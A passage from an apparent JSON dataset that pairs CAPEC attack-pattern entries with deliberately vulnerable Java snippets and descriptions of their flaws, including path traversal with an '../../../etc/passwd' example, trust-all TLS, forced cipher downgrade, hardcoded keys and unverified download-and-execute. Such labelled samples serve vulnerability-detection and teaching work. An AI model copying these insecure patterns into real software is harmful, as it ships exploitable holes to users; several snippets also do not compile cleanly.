        "code_snippet": "public class FileManager {\n    private static final String BASE_PATH = \"/var/www/files/\";\n\n    public String readFile(String fileName) {\n        File file = new File(BASE_PATH + fileName);\n        try {\n            return new String(Files.readAllBytes(file.toPath()));\n        } catch (IOException e) {\n            return \"Error reading file\";\n        }\n    }\n\n    public boolean saveFile(String fileName, String content) {\n        try {\n            File file = new File(BASE_PATH + fileName);\n            FileWriter writer = new FileWriter(file);\n            writer.write(content);\n            writer.close();\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}",
        "description": "This code is vulnerable to path traversal attacks as it directly concatenates user input (fileName) with a base path without proper validation. An attacker could use '../' sequences or absolute paths to access files outside the intended directory. For example, passing '../../../etc/passwd' as fileName could allow access to sensitive system files."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "public class DNSResolver {\n    public String resolveAndConnect(String ipAddress) {\n        try {\n            // Vulnerable: Relies on reverse DNS without verification\n            InetAddress addr = InetAddress.getByName(ipAddress);\n            String hostname = addr.getHostName();\n            \n            // Vulnerable: No validation of hostname authenticity\n            if (hostname.endsWith(\".trusted-domain.com\")) {\n                URL url = new URL(\"http://\" + hostname + \"/api/data\");\n                URLConnection conn = url.openConnection();\n                \n                // Vulnerable: No integrity checks on received data\n                try (InputStream stream = conn.getInputStream()) {\n                    // Download and execute content without verification\n                    byte[] content = stream.readAllBytes();\n                    return new String(content);\n                }\n            }\n            return null;\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable DNS resolution implementation that fails to properly validate DNS responses. It relies on reverse DNS resolution for security decisions, doesn't verify the authenticity of DNS responses, and downloads content without integrity checks. An attacker could exploit this by spoofing DNS responses to redirect requests to malicious hosts."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "public class SatelliteCommsSystem {\n    private static final String SATELLITE_ENDPOINT = \"sat://192.168.1.1:4444\";\n    private static final int TRANSMISSION_POWER = 100;\n    \n    public void transmitData(String sensitiveData) {\n        try {\n            // Establishing unsecured connection without endpoint verification\n            URL satEndpoint = new URL(SATELLITE_ENDPOINT);\n            URLConnection conn = satEndpoint.openConnection();\n            \n            // Transmitting data without encryption or integrity checks\n            PrintWriter out = new PrintWriter(conn.getOutputStream());\n            out.println(sensitiveData);\n            out.flush();\n            \n            // No signal strength or interference detection\n            DataInputStream in = new DataInputStream(conn.getInputStream());\n            String response = in.readLine();\n            \n            // Vulnerable broadcast intent without protection\n            Intent broadcastIntent = new Intent();\n            broadcastIntent.setAction(\"com.satellite.DATA_RECEIVED\");\n            broadcastIntent.putExtra(\"response\", response);\n            context.sendBroadcast(broadcastIntent);\n            \n        } catch(Exception e) {\n            System.out.println(\"Transmission failed: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable satellite communication implementation susceptible to signal jamming and interception. It transmits sensitive data in cleartext, lacks proper endpoint verification, doesn't implement message integrity checks, and uses unsecured broadcast intents. The code doesn't validate signal strength or detect interference, making it vulnerable to terrestrial jamming attacks within the specified ranges."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "public class AuthenticationService {\n    private Map<String, String> userCredentials = new HashMap<>();\n\n    public void registerUser(String username, String password) {\n        userCredentials.put(username, password);\n    }\n\n    public boolean authenticate(String username, String password) {\n        String storedPassword = userCredentials.get(username);\n        return storedPassword != null && storedPassword.equals(password);\n    }\n\n    public boolean login(String username, String password) {\n        // No rate limiting or attempt tracking\n        // No password complexity requirements\n        // Single-factor authentication only\n        // Passwords stored in plain text\n        // No password expiration mechanism\n        if (authenticate(username, password)) {\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities that make it susceptible to credential stuffing attacks. It stores passwords in plaintext, lacks rate limiting for login attempts, implements single-factor authentication only, has no password complexity requirements, and lacks password aging mechanisms. Additionally, it performs simple string comparison for password verification and maintains credentials in memory without encryption."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "public class VulnerableChannelHandler {\n    private Socket socket;\n    private boolean isAuthenticated = false;\n    private static final int MAX_MESSAGE_SIZE = 1000000;\n\n    public void handleConnection() {\n        try {\n            socket = new ServerSocket(12345).accept();\n            DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n            DataInputStream in = new DataInputStream(socket.getInputStream());\n\n            // Cleartext transmission of credentials\n            String credentials = in.readUTF();\n            if(credentials.equals(\"admin:password\")) {\n                isAuthenticated = true;\n            }\n\n            while(isAuthenticated) {\n                // No message size validation\n                byte[] message = new byte[MAX_MESSAGE_SIZE];\n                int bytesRead = in.read(message);\n\n                // No message integrity check\n                out.write(message, 0, bytesRead);\n                out.flush();\n\n                // Race condition in alternate channel setup\n                new Thread(() -> {\n                    try {\n                        Socket alternateChannel = new Socket(\"localhost\", 8080);\n                        alternateChannel.getOutputStream().write(message);\n                    } catch(Exception e) {\n                        e.printStackTrace();\n                    }\n                }).start();\n            }\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues in network communication: cleartext transmission of credentials, lack of message integrity checks, no validation of message volume, potential network amplification through unconstrained message forwarding, and a race condition in alternate channel establishment. The code allows unlimited message sizes and lacks proper endpoint verification, making it susceptible to denial of service attacks through radio interference or network flooding."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "public class LegacyAuthenticator {\n    @Deprecated\n    private boolean authenticate(String username, String password) {\n        // Using obsolete authentication method\n        return password.equals(\"admin\");\n    }\n    \n    public boolean login(String username, String password) {\n        try {\n            // Using dynamic class loading without proper validation\n            Class<?> authClass = Class.forName(username + \"Authenticator\");\n            Object authInstance = authClass.newInstance();\n            \n            // Using DNS lookup for authentication decision\n            InetAddress addr = InetAddress.getByName(username + \".trusted-domain.com\");\n            if (addr != null) {\n                return authenticate(username, password);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return false;\n    }\n}",
        "description": "This code demonstrates multiple deprecated and insecure authentication practices including the use of obsolete functions, unsafe dynamic class loading, and reliance on DNS lookups for security decisions. The code fails to properly protect stored data and implements an insecure authentication mechanism that could be easily bypassed."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "public class ResourceManager {\n    private static Map<String, List<Resource>> resourcePool = new HashMap<>();\n\n    public static void allocateResource(String userId, Resource resource) {\n        if (!resourcePool.containsKey(userId)) {\n            resourcePool.put(userId, new ArrayList<>());\n        }\n        resourcePool.get(userId).add(resource);\n    }\n\n    public static void processRequests(String userId) {\n        while (true) {\n            Resource resource = new Resource();\n            allocateResource(userId, resource);\n            // No limit checking, no cleanup, resources keep accumulating\n            // No timeout mechanism\n            Thread.sleep(10);\n        }\n    }\n\n    private static class Resource {\n        private byte[] data = new byte[1024 * 1024]; // 1MB per resource\n    }\n}",
        "description": "This vulnerable code demonstrates resource exhaustion by allowing unlimited allocation of resources without proper checks, cleanup, or throttling mechanisms. Each resource consumes 1MB of memory, and the continuous allocation without bounds can lead to OutOfMemoryError. The code lacks resource limits, timeout mechanisms, and proper cleanup, making it susceptible to denial of service attacks through resource exhaustion."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "public class WiFiConnection {\n    private Socket socket;\n    private String accessPointSSID;\n    private boolean isAuthenticated = false;\n\n    public void connect(String ssid, String password) {\n        try {\n            accessPointSSID = ssid;\n            socket = new Socket(ssid, 80);\n            // No verification of AP identity\n            String authMessage = ssid + \":\" + password;\n            // Sending credentials in cleartext\n            socket.getOutputStream().write(authMessage.getBytes());\n            isAuthenticated = true;\n\n            // No message integrity checks\n            while (isAuthenticated) {\n                byte[] buffer = new byte[1024];\n                socket.getInputStream().read(buffer);\n                processWiFiFrame(buffer);\n            }\n        } catch (IOException e) {\n            reconnect(); // Automatic reconnection without verification\n        }\n    }\n\n    private void processWiFiFrame(byte[] frame) {\n        // No deauthentication frame validation\n        if (frame[0] == 0xC0) { // Deauth frame type\n            isAuthenticated = false;\n            reconnect();\n        }\n    }\n\n    private void reconnect() {\n        try {\n            // Vulnerable to race conditions during reconnection\n            Thread.sleep(1000);\n            connect(accessPointSSID, \"\");\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a WiFi connection implementation that's susceptible to deauthentication attacks and various security issues. It lacks proper authentication verification, transmits sensitive data in cleartext, doesn't validate message integrity, and is vulnerable to race conditions during reconnection attempts. The code also doesn't properly verify the identity of the access point and automatically attempts to reconnect without proper security checks."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "public class CellularCommunicationManager {\n    private Socket cellTowerConnection;\n    private String deviceId;\n    \n    public void establishConnection(String towerId) {\n        try {\n            cellTowerConnection = new Socket(\"cell-tower.network\", 4444);\n            // No encryption or validation of tower identity\n            String authMessage = deviceId + \",CONNECT\";\n            \n            // Send authentication in plaintext\n            PrintWriter out = new PrintWriter(cellTowerConnection.getOutputStream(), true);\n            out.println(authMessage);\n            \n            // Accept any response without verification\n            BufferedReader in = new BufferedReader(\n                new InputStreamReader(cellTowerConnection.getInputStream()));\n            String response = in.readLine();\n            \n            // No signal strength or interference checking\n            processSignalingMessages(in);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processSignalingMessages(BufferedReader in) throws IOException {\n        String message;\n        while ((message = in.readLine()) != null) {\n            // Process all incoming messages without validation\n            // No checking for message integrity or signal interference\n            handleSignalingMessage(message);\n        }\n    }\n    \n    private void handleSignalingMessage(String message) {\n        // No rate limiting or validation of message frequency\n        // Vulnerable to signal flooding\n        processMessage(message);\n    }\n}",
        "description": "This vulnerable code demonstrates a cellular communication implementation that lacks proper security measures. It transmits sensitive data in cleartext, doesn't validate the cell tower's identity, performs no message integrity checks, and is susceptible to signal jamming and flooding attacks. The code doesn't implement any protection against physical side-channel attacks or verify the source of communications, making it vulnerable to man-in-the-middle attacks and signal interference."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "public class InsecureCommunicationHandler {\n    private static final String HARDCODED_KEY = \"0123456789abcdef\";\n    private static final String[] SUPPORTED_CIPHERS = {\"NULL\", \"DES\", \"RC4\", \"AES\"};\n    \n    public void negotiateConnection(Socket socket) {\n        try {\n            DataInputStream in = new DataInputStream(socket.getInputStream());\n            DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n            \n            // Accept any cipher suggested by client, even weak ones\n            String clientCipher = in.readUTF();\n            if(Arrays.asList(SUPPORTED_CIPHERS).contains(clientCipher)) {\n                // Don't validate if cipher is strong enough\n                Cipher cipher = Cipher.getInstance(clientCipher);\n                SecretKeySpec keySpec = new SecretKeySpec(HARDCODED_KEY.getBytes(), clientCipher);\n                cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n                \n                // Send data without message integrity check\n                byte[] data = \"sensitive_data\".getBytes();\n                byte[] encryptedData = cipher.doFinal(data);\n                out.write(encryptedData);\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates an insecure communication protocol that allows algorithm downgrade attacks. It uses a hardcoded cryptographic key, accepts weak encryption algorithms including NULL encryption, lacks message integrity validation, and doesn't enforce strong encryption requirements. The code mimics a base station that can be forced to use weak or no encryption, making it vulnerable to man-in-the-middle attacks and data interception."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "public class ResourceManager {\n    private static volatile boolean isProcessing = false;\n    private static Object sharedResource = null;\n\n    public static void processResource(Object resource) {\n        try {\n            if (!isProcessing) {\n                isProcessing = true;\n                sharedResource = resource;\n                \n                // Simulating long processing without proper synchronization\n                Thread worker = new Thread(() -> {\n                    try {\n                        Thread.sleep(1000);\n                        sharedResource.toString();\n                    } catch (InterruptedException e) {\n                        // Empty catch block - fault handling ignored\n                    } finally {\n                        isProcessing = false;\n                    }\n                });\n                \n                Thread disruptor = new Thread(() -> {\n                    sharedResource = null;\n                });\n                \n                worker.start();\n                disruptor.start();\n            }\n        } catch (Exception e) {\n            // Generic exception handler - masks specific errors\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates component interaction obstruction through race conditions, improper isolation, and fault handling issues. The code allows concurrent access to shared resources without proper synchronization, enabling resource nullification during processing. It lacks proper error handling and compartmentalization, making it susceptible to component interaction disruption and system degradation."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "public class WeakGSMEncryption {\n    private static final String HARDCODED_KEY = \"0xA5B7C9D1E3\";\n    \n    public byte[] encryptTraffic(byte[] data) {\n        // Using weak A5/1 GSM encryption algorithm\n        String algorithm = \"DES\"; // Deliberately weak encryption\n        try {\n            if (negotiateAlgorithm().equals(\"STRONG\")) {\n                algorithm = \"DES\"; // Force downgrade to weak encryption\n            }\n            \n            Cipher cipher = Cipher.getInstance(algorithm + \"/ECB/NoPadding\");\n            SecretKeySpec keySpec = new SecretKeySpec(\n                HARDCODED_KEY.getBytes(), algorithm\n            );\n            cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n            return cipher.doFinal(data);\n        } catch (Exception e) {\n            return data; // Falls back to plaintext on error\n        }\n    }\n    \n    private String negotiateAlgorithm() {\n        // Always downgrade to weaker encryption\n        return \"WEAK\";\n    }\n}",
        "description": "This code demonstrates multiple cryptographic vulnerabilities common in cellular encryption implementations. It uses a weak DES algorithm, hardcoded encryption key, forces algorithm downgrade during negotiation, and implements no protection against side-channel attacks. The code uses ECB mode without proper padding, and falls back to plaintext on error, making it particularly vulnerable to cryptanalysis attacks."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "public class MobileDataTransmitter {\n    private String apiKey = \"sk_live_12345\";\n    private String userCredentials = \"admin:password123\";\n\n    public void sendSensitiveData(String phoneNumber, String personalData) {\n        try {\n            // Send data over unencrypted socket connection\n            Socket socket = new Socket(\"api.service.com\", 80);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            \n            // Sending sensitive data in cleartext\n            out.println(\"API_KEY:\" + apiKey);\n            out.println(\"CREDENTIALS:\" + userCredentials);\n            out.println(\"PHONE:\" + phoneNumber);\n            out.println(\"DATA:\" + personalData);\n            \n            // Android implicit intent for sharing data\n            Intent shareIntent = new Intent();\n            shareIntent.setAction(Intent.ACTION_SEND);\n            shareIntent.putExtra(Intent.EXTRA_TEXT, personalData);\n            shareIntent.setType(\"text/plain\");\n            context.startActivity(shareIntent);\n            \n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities related to mobile data transmission including cleartext transmission of sensitive data (CWE-319), missing encryption (CWE-311), improper verification of communication channel (CWE-940), lack of message integrity checks (CWE-924), and unsafe use of implicit intents in Android (CWE-927). The code transmits API keys, credentials, and personal data in plaintext over an unencrypted socket connection and uses an unsafe implicit intent for sharing sensitive data."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "public class InsecureDataTransmission {\n    private static final String DEBUG_KEY = \"debug123\";\n    private Socket socket;\n    private boolean debugMode = false;\n\n    public void sendSensitiveData(String userData, String deviceId) {\n        try {\n            socket = new Socket(\"server.example.com\", 8080);\n            DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n            \n            // Debug mode can be activated during runtime\n            if (debugMode) {\n                out.writeUTF(\"DEBUG_MODE:\" + DEBUG_KEY);\n            }\n            \n            // Sending sensitive data in cleartext\n            String message = \"USER_DATA:\" + userData + \",DEVICE_ID:\" + deviceId + \",CC_NUM:4111111111111111\";\n            out.writeUTF(message);\n            \n            // No message integrity check\n            for (int i = 0; i < 1000; i++) {\n                // Sending multiple copies - potential amplification\n                out.writeUTF(message);\n            }\n            \n            out.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void setDebugMode(boolean mode) {\n        this.debugMode = mode;\n    }\n}",
        "description": "This vulnerable code demonstrates transmission of sensitive data over a network with multiple security issues: enabling debug mode at runtime, sending sensitive data in cleartext, lack of message integrity checks, potential network amplification through message flooding, and inclusion of sensitive information (credit card numbers) in transmitted data."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "public class DomainRedirector {\n    public void redirectToSite(HttpServletRequest request, HttpServletResponse response) {\n        String targetDomain = request.getParameter(\"domain\");\n        String token = request.getParameter(\"auth\");\n        \n        // Vulnerable: No validation of domain similarity to trusted domains\n        // Vulnerable: Using GET method with sensitive parameters\n        if (isValidToken(token)) {\n            String redirectUrl = \"https://\" + targetDomain + \"/download?token=\" + token;\n            response.sendRedirect(redirectUrl);\n            \n            // Vulnerable: Downloads and executes code without integrity check\n            URLConnection conn = new URL(redirectUrl + \"/code.jar\").openConnection();\n            InputStream is = conn.getInputStream();\n            // Execute downloaded code directly\n            loadAndExecuteCode(is);\n        }\n    }\n    \n    private boolean isValidToken(String token) {\n        // Vulnerable: Simple token check without protection against replay attacks\n        return token != null && token.length() > 0;\n    }\n    \n    private void loadAndExecuteCode(InputStream is) throws Exception {\n        // Vulnerable: Executing code without verification\n        URLClassLoader loader = new URLClassLoader(new URL[]{new URL(\"file:temp.jar\")});\n        Class<?> loadedClass = loader.loadClass(\"downloaded.Main\");\n        loadedClass.getMethod(\"main\").invoke(null);\n    }\n}",
        "description": "This vulnerable code demonstrates a domain redirection system that's susceptible to bitsquatting attacks. It accepts user input for domain redirection without proper validation, uses GET parameters for sensitive data, downloads and executes code without integrity checks, and implements weak authentication that's vulnerable to replay attacks. The code could be exploited by attackers registering similar-looking domains and capturing traffic through bit-flipping attacks."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "public class WifiTracker {\n    private Map<String, List<LocationData>> macAddressLog = new HashMap<>();\n    \n    public void captureWifiTraffic() {\n        try {\n            NetworkInterface wifiInterface = NetworkInterface.getByName(\"wlan0\");\n            PacketCapture pcap = new PacketCapture(wifiInterface);\n            \n            while (true) {\n                WifiPacket packet = pcap.captureNextPacket();\n                String macAddress = packet.getSourceMAC();\n                GPS gps = GPS.getCurrentLocation();\n                \n                // Store MAC address with location without encryption or access control\n                LocationData location = new LocationData(gps.getLat(), gps.getLong(), System.currentTimeMillis());\n                if (!macAddressLog.containsKey(macAddress)) {\n                    macAddressLog.put(macAddress, new ArrayList<>());\n                }\n                macAddressLog.get(macAddress).add(location);\n                \n                // Transmit data over unsecured channel\n                sendToServer(macAddress, location);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void sendToServer(String mac, LocationData location) {\n        Socket socket = new Socket(\"tracking-server.com\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(mac + \",\" + location.toString());\n    }\n}",
        "description": "This code demonstrates a WiFi tracking system that captures MAC addresses and location data from nearby devices. It's vulnerable because it: 1) Stores sensitive MAC address data without encryption, 2) Transmits location data over an unsecured channel, 3) Lacks access control for the collected data, 4) Doesn't validate the authenticity of captured packets, and 5) Makes the tracking data accessible without proper authorization."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "public class WifiMonitor {\n    private String networkSSID;\n    private String userIdentity;\n\n    public void broadcastWifiBeacon() {\n        while(true) {\n            // Broadcast WiFi management frame with SSID in clear text\n            String beaconFrame = \"SSID=\" + networkSSID + \";User=\" + userIdentity;\n            sendWifiBeacon(beaconFrame);\n            Thread.sleep(100);\n        }\n    }\n\n    public void connectToNetwork() {\n        // Send probe request with stored SSID in clear text\n        String probeRequest = \"ProbeReq:\" + networkSSID + \";Device=\" + getDeviceMAC();\n        sendProbeRequest(probeRequest);\n    }\n\n    private void sendWifiBeacon(String frame) {\n        // Simulated wireless transmission without encryption\n        wirelessTransmit(frame.getBytes());\n    }\n\n    private void sendProbeRequest(String request) {\n        // Simulated probe request without proper security checks\n        wirelessTransmit(request.getBytes());\n    }\n\n    private void wirelessTransmit(byte[] data) {\n        // Simulated wireless transmission\n    }\n\n    private String getDeviceMAC() {\n        return \"00:11:22:33:44:55\";\n    }\n}",
        "description": "This code demonstrates a vulnerable WiFi implementation that broadcasts network SSID and user identity information in clear text through management frames and probe requests. The code fails to protect sensitive identifiers and allows passive monitoring of WiFi communications, enabling user tracking through SSID correlation. It lacks proper channel security and identity verification mechanisms, making it susceptible to unauthorized monitoring and tracking attacks."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "public class SIMUpdater {\n    private static final String DES_KEY = \"0123456789ABCDEF\"; // Weak DES key\n    \n    public void processOTAUpdate(String smsPayload) {\n        try {\n            // Using weak DES encryption\n            Cipher cipher = Cipher.getInstance(\"DES/ECB/PKCS5Padding\");\n            SecretKeySpec key = new SecretKeySpec(DES_KEY.getBytes(), \"DES\");\n            cipher.init(Cipher.DECRYPT_MODE, key);\n            \n            // Decode and execute received binary SMS without proper validation\n            byte[] decodedPayload = cipher.doFinal(Base64.decode(smsPayload, Base64.DEFAULT));\n            JavaApplet simApplet = loadApplet(decodedPayload);\n            \n            // Execute applet without proper authorization checks\n            simApplet.execute();\n            \n            // Allow unrestricted access to sensitive SIM functions\n            sendSMS(simApplet.getDestination(), simApplet.getMessage());\n            updateVoicemail(simApplet.getVoicemailNumber());\n            getLocation();\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private JavaApplet loadApplet(byte[] payload) {\n        // Directly load and return applet without verification\n        return new JavaApplet(payload);\n    }\n}",
        "description": "This code demonstrates a vulnerable SIM card update mechanism that uses weak DES encryption, lacks proper signature verification, and allows unrestricted execution of received applets. It implements insecure OTA updates via SMS, using a fixed DES key and providing unrestricted access to sensitive SIM card functions without proper authorization checks."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "public class WifiManager {\n    private Socket clientSocket;\n    private String ssid = \"Free-Public-WiFi\";\n    private String password = \"\";\n\n    public void connectToNetwork() {\n        try {\n            // Connect to an unsecured WiFi network without verification\n            clientSocket = new Socket(\"192.168.1.1\", 8080);\n            \n            // Send sensitive data without encryption\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n            out.println(\"username=admin&password=secret123\");\n            \n            // Receive data without verifying source or checking message integrity\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            String response = in.readLine();\n            \n            // Process received data without validation\n            processResponse(response);\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processResponse(String response) {\n        // Process potentially malicious response without verification\n        System.out.println(\"Received: \" + response);\n    }\n}",
        "description": "This code demonstrates a vulnerable WiFi connection implementation that makes several security mistakes: it connects to an unverified network, transmits sensitive data in cleartext, doesn't verify the identity of the network endpoint, and processes received data without proper validation. This makes it susceptible to evil twin attacks where an attacker could set up a rogue access point to intercept communications."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "public class ResourceLoader {\n    private static final String EXPECTED_BASE_URL = \"https://legitimate-cdn.com/resources/\";\n    \n    public static String loadResource(String resourcePath) {\n        try {\n            String fullPath = EXPECTED_BASE_URL + resourcePath;\n            URL url = new URL(fullPath);\n            URLConnection conn = url.openConnection();\n            \n            // No validation of SSL certificate or actual hostname\n            try (BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(conn.getInputStream()))) {\n                StringBuilder content = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    content.append(line);\n                }\n                return content.toString();\n            }\n        } catch (IOException e) {\n            // If main resource fails, try backup location without verification\n            try {\n                String backupPath = \"http://backup-cdn.\" + resourcePath;\n                URL backupUrl = new URL(backupPath);\n                URLConnection backupConn = backupUrl.openConnection();\n                return new BufferedReader(\n                    new InputStreamReader(backupConn.getInputStream())\n                ).readLine();\n            } catch (IOException ex) {\n                return null;\n            }\n        }\n    }\n}",
        "description": "This vulnerable code attempts to load resources from a CDN but fails to properly verify the source of the resource. It accepts any resource path without validation, doesn't verify SSL certificates, and falls back to an insecure backup location when the main resource fails. This allows attackers to serve malicious content from similar-looking domains or manipulate the resource path to access unauthorized resources."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "public class CellularDevice {\n    private String deviceId;\n    private String currentBaseStation;\n    \n    public void connectToStrongestSignal(String baseStationId, int signalStrength) {\n        // Immediately connects to strongest signal without verification\n        if (signalStrength > -50) {  // Strong signal threshold\n            currentBaseStation = baseStationId;\n            establishConnection(baseStationId);\n        }\n    }\n    \n    private void establishConnection(String baseStationId) {\n        // No authentication or verification of base station identity\n        Socket connection = new Socket();\n        try {\n            connection.connect(new InetSocketAddress(baseStationId, 5555));\n            DataOutputStream out = new DataOutputStream(connection.getOutputStream());\n            // Sends sensitive data without encryption or integrity checks\n            out.writeUTF(\"DeviceID:\" + deviceId + \",Key:\" + getSecretKey());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private String getSecretKey() {\n        return \"SECRET_KEY_12345\";\n    }\n}",
        "description": "This vulnerable code demonstrates a cellular device that connects to base stations based solely on signal strength, without proper authentication or verification. It fails to validate the legitimacy of the base station, doesn't implement encryption, and sends sensitive data over an unsecured channel. The code is susceptible to rogue base station attacks where an attacker can set up a fake base station with a strong signal to intercept communications."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "public class LocationTracker {\n    private String targetPhoneNumber;\n    private String cellTowerId;\n    \n    public void sendBroadcastMessage(String message) {\n        Intent broadcastIntent = new Intent();\n        broadcastIntent.setAction(\"com.example.LOCATION_CHECK\");\n        broadcastIntent.putExtra(\"phone_number\", targetPhoneNumber);\n        broadcastIntent.putExtra(\"message\", message);\n        context.sendBroadcast(broadcastIntent);\n    }\n    \n    public boolean verifyTargetLocation(String lacCode) {\n        String networkResponse = sendNetworkQuery(targetPhoneNumber, lacCode);\n        boolean messageReceived = listenForBroadcast(lacCode);\n        \n        // Vulnerable: No verification of message integrity or source\n        if(messageReceived) {\n            logLocationData(targetPhoneNumber, lacCode, cellTowerId);\n            return true;\n        }\n        return false;\n    }\n    \n    private void logLocationData(String phoneNumber, String lacCode, String towerId) {\n        // Sensitive information exposed in logs\n        Log.d(\"LocationTracker\", \"Phone: \" + phoneNumber + \n              \" found in LAC: \" + lacCode + \n              \" Tower: \" + towerId);\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation of a location tracking system using cellular network broadcasts. It contains multiple security issues: uses implicit intents for sensitive communication, lacks proper verification of message source and integrity, exposes sensitive information in logs, and doesn't properly secure the communication channel against unauthorized access."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "public class LocationTracker {\n    private String deviceId;\n    private double latitude;\n    private double longitude;\n    private WifiManager wifiManager;\n    \n    public void transmitLocation() {\n        // Unprotected location broadcast\n        String wifiMac = wifiManager.getConnectionInfo().getMacAddress();\n        SignalStrength signal = telephonyManager.getSignalStrength();\n        \n        // Broadcasting sensitive data without encryption or verification\n        String locationData = String.format(\"%s,%f,%f,%d,%s\",\n            deviceId,\n            latitude,\n            longitude,\n            signal.getLevel(),\n            wifiMac\n        );\n        \n        // Transmitting on an open channel without verification\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(\n            locationData.getBytes(),\n            locationData.length(),\n            InetAddress.getByName(\"tracking-server.com\"),\n            9876\n        );\n        socket.send(packet);\n    }\n    \n    // Signal handler vulnerable to interruption\n    public void handleLocationUpdate(SignalEvent event) {\n        // Shared state without proper synchronization\n        this.latitude = event.getLatitude();\n        this.longitude = event.getLongitude();\n        transmitLocation();\n    }\n}",
        "description": "This vulnerable code demonstrates unprotected transmission of location data and signal strength information over a network. It includes sensitive device identifiers (MAC address), lacks proper encryption and source verification, and uses an unsafe signal handler. The code allows passive monitoring of signal strength and location data, making it susceptible to location tracking attacks."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "public class InsecureSSLNegotiator {\n    private static final String HARDCODED_KEY = \"abc123\";\n    \n    public Socket createSSLSocket(String host, int port) throws Exception {\n        SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n        TrustManager[] trustAllCerts = new TrustManager[] {\n            new X509TrustManager() {\n                public X509Certificate[] getAcceptedIssuers() { return null; }\n                public void checkClientTrusted(X509Certificate[] certs, String authType) {}\n                public void checkServerTrusted(X509Certificate[] certs, String authType) {}\n            }\n        };\n        \n        sslContext.init(null, trustAllCerts, new SecureRandom());\n        SSLSocketFactory factory = sslContext.getSocketFactory();\n        SSLSocket socket = (SSLSocket) factory.createSocket(host, port);\n        \n        // Downgrade to weak cipher suites\n        String[] weakCiphers = {\"SSL_RSA_WITH_RC4_128_MD5\", \"SSL_RSA_EXPORT_WITH_RC4_40_MD5\"};\n        socket.setEnabledCipherSuites(weakCiphers);\n        \n        // Store sensitive data in cleartext\n        String sensitiveData = \"password123\";\n        FileWriter writer = new FileWriter(\"credentials.txt\");\n        writer.write(sensitiveData);\n        writer.close();\n        \n        return socket;\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including algorithm downgrade by forcing weak SSL cipher suites, using a hardcoded cryptographic key, storing sensitive information in cleartext, and implementing an insecure trust manager that accepts all certificates. It allows for SSL/TLS protocol downgrade attacks and exposes sensitive data through weak encryption and cleartext storage."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
